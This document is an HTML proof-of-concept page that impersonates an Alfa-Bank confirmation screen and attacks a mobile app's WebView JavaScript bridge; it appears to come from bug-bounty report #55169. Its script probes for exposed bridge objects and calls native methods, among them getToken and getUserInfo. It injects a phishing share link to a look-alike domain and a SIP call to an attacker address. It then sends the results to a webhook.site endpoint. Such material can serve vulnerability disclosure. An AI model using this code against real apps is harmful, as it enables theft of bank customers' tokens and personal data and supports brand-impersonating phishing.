<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Альфа-Банк — Подтверждение операции</title>
<style>
body { font-family: -apple-system, sans-serif; padding: 16px; background:#fff; margin:0; }
.logo { color: #EF3124; font-weight: 700; font-size: 24px; margin-bottom: 8px; }
h2 { font-size: 18px; }
.box { background: #f5f5f5; padding: 12px; border-radius: 8px; margin: 8px 0; font-size: 11px; }
.ok { color: #00aa00; font-weight: 600; }
.err { color: #cc0000; }
pre { white-space: pre-wrap; word-break: break-all; font-size: 10px; }
</style>
</head>
<body>
<div class="logo">α-Bank</div>
<h2>Bridge Invocation PoC — #55169</h2>
<div id="status" class="box">Running probes...</div>

<script>
const results = {
    location: location.href,
    bridges_present: {},
    method_invocations: {}
};

// Bridge namespaces
const bridgeNames = ['Android', 'AndroidSdk', 'webViewBridge', 'D3SJS', 'jsBridge', 'appInterface'];

for (const name of bridgeNames) {
    if (typeof window[name] !== 'undefined') {
        results.bridges_present[name] = typeof window[name];
    }
}

// Try invoking each expected method even if not enumerable
const methodsToProbe = [
    {name: 'sendEventToAppsFlyer', payload: '{"eventName":"PoC_BRIDGE_INJECTED","eventValues":{"poc":"true"}}'},
    {name: 'setPageSettings', payload: '{"pageId":"poc","pageTitle":"ATTACKER_INJECTED"}'},
    {name: 'handleError', payload: ['0','poc_id','poc_text']},
    {name: 'shareData', payload: ['PoC Title','PoC Desc','https://notalfabank.ru/icon.png','https://notalfabank.ru/phish_target']},
    {name: 'openCallScreen', payload: ['sip:attacker@evil.com']},
    {name: 'getToken', payload: []},
    {name: 'getUserInfo', payload: []},
    {name: 'postMessage', payload: ['{"type":"PoC","data":"injected"}']},
    {name: 'close', payload: []},
    {name: 'onPageLoaded', payload: []}
];

if (window.Android) {
    for (const probe of methodsToProbe) {
        const m = probe.name;
        const before = typeof window.Android[m];
        const r = {existed_before: before};
        try {
            if (Array.isArray(probe.payload)) {
                window.Android[m].apply(window.Android, probe.payload);
            } else {
                window.Android[m](probe.payload);
            }
            r.invocation = "OK_NO_THROW";
            r.result_callable = true;
        } catch(e) {
            r.exception = e.toString();
            // Java exception = bridge dispatched, native code threw → method EXISTS on bridge
            r.result_callable = e.toString().includes('Java exception was raised') ? true : 'partial';
        }
        results.method_invocations[m] = r;
    }
}

// Final: render in DOM
const summary = {
    bridge_exposed: Object.keys(results.bridges_present),
    callable_methods: Object.keys(results.method_invocations).filter(m => 
        results.method_invocations[m].result_callable === true),
    detail: results
};

document.getElementById('status').innerHTML = '<pre>' + JSON.stringify(summary, null, 2) + '</pre>';

// Exfil to webhook
fetch('https://webhook.site/echo?test=55169v2&data=' + encodeURIComponent(JSON.stringify(summary).substring(0, 2000)), {mode:'no-cors'}).catch(e => {});

document.title = 'CALLABLE: ' + summary.callable_methods.join(',');
</script>
</body>
</html>
